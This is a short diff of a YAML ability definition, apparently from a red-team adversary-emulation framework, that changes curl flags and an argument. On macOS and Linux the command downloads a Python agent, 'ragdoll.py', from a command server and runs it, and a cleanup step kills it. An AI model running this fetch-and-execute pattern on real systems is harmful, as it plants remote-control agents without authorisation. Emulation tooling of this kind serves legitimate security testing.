@@ -10,15 +10,15 @@
       sh:
         command: |
           server="#{app.contact.http}";
-          curl -svkOJ -X POST -H "file:ragdoll.py" -H "platform:darwin" $server/file/download > ragdoll.py;
-          python ragdoll.py -website $server#{app.contact.html}
+          curl -s -X POST -H "file:ragdoll.py" -H "platform:darwin" $server/file/download > ragdoll.py;
+          python ragdoll.py -W $server#{app.contact.html}
         cleanup: |
           pkill -f ragdoll
     linux:
       sh:
         command: |
           server="#{app.contact.http}";
-          curl -svkOJ -X POST -H "file:ragdoll.py" -H "platform:darwin" $server/file/download > ragdoll.py;
-          python ragdoll.py -website $server#{app.contact.html}
+          curl -s -X POST -H "file:ragdoll.py" -H "platform:darwin" $server/file/download > ragdoll.py;
+          python ragdoll.py -W $server#{app.contact.html}
         cleanup: |
           pkill -f ragdoll
